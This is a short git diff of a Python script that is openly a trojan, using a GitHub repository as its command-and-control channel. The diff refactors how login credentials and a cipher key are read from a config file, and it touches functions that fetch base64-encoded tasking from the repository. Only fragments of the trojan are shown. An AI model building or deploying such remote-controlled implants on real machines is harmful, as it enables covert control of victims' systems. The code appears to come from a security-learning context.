@@ -17,6 +17,13 @@ from github3 import login
 with open('config/keys.json') as json_data:
 	account_data = json.load(json_data)[0]
 
+key = account_data['cipher_key']
+
+u_name = account_data['username']
+u_pass = account_data['password']
+u_repo = account_data['repository']
+
+
 gl = cmd.Git('.')
 
 trojan_id = "abc"
@@ -28,10 +35,10 @@ configured = False
 task_queue = Queue.Queue()
 
 def connect_to_github():
-	# remote
-	gh = login(username=account_data['username'], password=account_data['password'])
-	repo = gh.repository(account_data['username'], accound_data['repository'])
-	branch = repo.branch("master")
+
+	gh = login(username=u_name, password=u_pass)
+	repo = gh.repository(u_name, u_repo)
+	branch = repo.branch('master')
 
 	return gh, repo, branch
 
@@ -51,6 +58,7 @@ def get_file_contents(filepath):
 
 def get_trojan_config():
 	global configured
+
 	config_json = get_file_contents(trojan_config)
 	config = json.loads(base64.b64decode(config_json))
 	configured = True
